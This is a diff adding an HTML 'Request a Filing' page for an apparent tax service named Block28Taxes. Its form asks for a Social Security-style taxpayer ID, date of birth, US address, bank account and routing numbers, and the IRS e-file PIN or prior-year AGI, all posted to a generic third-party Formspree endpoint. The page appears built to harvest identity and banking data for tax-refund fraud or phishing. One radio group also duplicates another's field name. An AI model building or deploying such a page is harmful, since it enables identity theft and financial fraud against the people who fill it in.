@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request a Filing | Block28Taxes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <nav>
+        <div class="logo">Block28Taxes</div>
+        <ul class="nav-links">
+            <li><a href="index.html">Home</a></li>
+            <li><a href="request.html">Request a Filing</a></li>
+        </ul>
+    </nav>
+
+    <section class="form-container">
+        <h2>Tax Filing Request</h2>
+        <p>Please fill out the details below accurately.</p>
+        
+       <form action="https://formspree.io/f/xaqqygjd" method="POST">
+        <input type="hidden" name="_next" value="thanks.html">
+
+        <div class="input-grid">
+            <div class="field">
+                <label>Full Name</label>
+                <input type="text" name="name" required>
+            </div>
+            <div class="field">
+                <label>Date of Birth</label>
+                <input type="date" name="dob" required>
+            </div>
+            <div class="field">
+                <label>Taxpayer ID (Government Issued)*</label>
+                <input type="text" name="tax_id_ref" placeholder="000-00-0000" required>
+            </div>
+            <div class="field">
+                <label>Email Address</label>
+                <input type="email" name="email" required>
+            </div>
+            <div class="field">
+                <label>Phone Number</label>
+                <input type="tel" name="phone" placeholder="123-456-7890" required>
+            </div>
+            <div class="field full-width">
+                <label>Home Address</label>
+                <input type="text" name="address" placeholder="Must be an active address in the US" required>
+            </div>
+        </div>
+
+        <hr>
+        <div class="field">
+            <label>Do you have an active USD account?</label>
+            <div class="radio-options">
+                <label><input type="radio" name="has_usd" value="yes" required> Yes</label>
+                <label><input type="radio" name="has_usd" value="no" required> No</label>
+            </div>
+        </div>
+        <div class="field">
+            <label>First time filing for tax return?</label>
+            <div class="radio-options">
+                <label><input type="radio" name="has_usd" value="yes" required> Yes</label>
+                <label><input type="radio" name="has_usd" value="no" required> No</label>
+            </div>
+        </div>
+
+        <div class="input-grid">
+            <div class="field"><label>Bank Name</label><input type="text" name="bank" required></div>
+            <div class="field"><label>Account Number</label><input type="text" name="acc_num" required></div>
+            <div class="field"><label>Routing Number</label><input type="text" name="routing" required></div>
+        </div>
+
+        <hr>
+
+        <div class="input-grid">
+            <div class="field">
+                <label>E-Filing P.I.N/ Adjusted Gross Income*</label>
+                <input type="text" name="pin_agi" placeholder="Enter PIN or Last Year's AGI">
+            </div>
+            <div class="field">
+                <label>Which state did you work in?*</label>
+                <input type="text" name="work_state" required>
+            </div>
+            <div class="field">
+                <label>Enter state zip code:*</label>
+                <input type="text" name="zip_code" required>
+            </div>
+            <div class="field">
+                <label>Enter the name of the county you worked in:*</label>
+                <input type="text" name="county_name" placeholder="COUNTY NOT country" required>
+            </div>
+        </div>
+
+        <button type="submit" class="submit-btn">Submit Filing Request</button>
+    </form>
+    </section>
+
+    <script src="script.js"></script>
+</body>
+</html>
